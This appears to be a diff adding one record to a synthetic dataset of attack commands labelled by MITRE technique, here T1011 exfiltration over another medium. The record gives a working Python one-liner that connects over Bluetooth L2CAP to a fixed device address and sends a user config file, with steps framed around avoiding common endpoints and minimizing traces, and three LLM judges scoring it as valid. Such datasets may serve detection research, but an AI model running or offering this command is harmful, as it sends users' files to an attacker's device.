@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('38:18:4C:AA:BB:CC', 0x1001)); p=os.path.expanduser('~/.config/user-dirs.dirs'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Exfiltrates via Bluetooth L2CAP on a dynamic PSM (0x1001), using a medium distinct from the primary communication channel in line with T1011.",
+  "rationale_steps": [
+    "Select Bluetooth L2CAP to leverage a non-IP transport path.",
+    "Connect to a dynamic PSM (0x1001) to avoid common service endpoints.",
+    "Read a user config file and send its raw bytes via L2CAP.",
+    "Close the socket promptly to minimize traces."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-3ac447bb",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Python one-liner with balanced quotes/parentheses, proper separators, and import usage that should parse correctly.",
+        "semantic_score": 4,
+        "semantic_justification": "Automates sending a local file over a Bluetooth L2CAP socket to a specified BD_ADDR/PSM consistent with automated exfiltration, though it relies on Bluetooth support and a listening peer for success.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T04:43:39.740862Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed Python code with balanced quotes, parentheses, and proper syntax for socket operations, file reading, and data transmission.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements automated exfiltration by reading a configuration file and transmitting it over Bluetooth L2CAP to a specific MAC address, which aligns perfectly with the T1011 technique of using an alternative protocol for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:43:52.668713Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with correct syntax for imports, socket creation, method calls, file operations, and balanced delimiters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements automated exfiltration using a Python L2CAP Bluetooth socket to send a user configuration file to an external address, directly aligning with the T1011 technique description.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:08:41.014846Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
